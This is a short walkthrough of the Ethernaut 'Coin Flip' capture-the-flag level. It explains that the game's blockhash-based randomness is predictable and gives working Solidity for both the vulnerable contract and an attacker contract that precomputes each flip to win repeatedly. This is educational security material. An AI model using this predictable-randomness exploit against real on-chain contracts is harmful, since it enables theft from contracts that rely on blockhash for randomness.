# Coin Flip

So the contract takes in your guess and then see that you guess was same as `True` or `False`, which it generated in someway. If it was your `Win` goes +1 if not everything goes back to `0`.

### outcome generation

The way it generates the outcome is in the following way:
- Take current blockhash
- generate a uint256 from that hash
- Divide it by the `FACTOR` value
- If that value is `1` then it should be `true` else `false`.

## Solution

I had to see how the solution was done, so I read this(https://github.com/dmidye/EthernautChallengeSolutions/blob/master/03-Coinflip/Coinflip.md)

The solution is actually pretty neat, we use all the code from the main contract and then in the process of decision making we see that if the answer would be `true` so we send `true`, if the answer will be `false` then we send `false`.

This is because the factors responsible for calculating the win/loss are very predictable. 
- 1 is the current block number
- Another is hardcoded string

## Exploit Code

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.2.0/contracts/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract CoinFlipHack {

  using SafeMath for uint256;
  CoinFlip ogContract = CoinFlip(0x9add8Ab90055E2F8fa4F2041d6d11A7dDd93152F);
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function fliphack() public{
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == true) {
        ogContract.flip(true);

    } else {
        ogContract.flip(false);
    }
  }
}
```

In the `Environment` of the Remix use `Injected Web3`. Then deploy the `CoinFlipHack` and call it 10 times.

If in doubt then just go to the console and run `await contract.consecutiveWins()` and it will return the object which contains the wins you've had.

```json
{
  "negative": 0,
  "words": [
    6,
    null
  ],
  "length": 1,
  "red": null
}
```

See the `6` in words that is the consecutiveWins I've had.
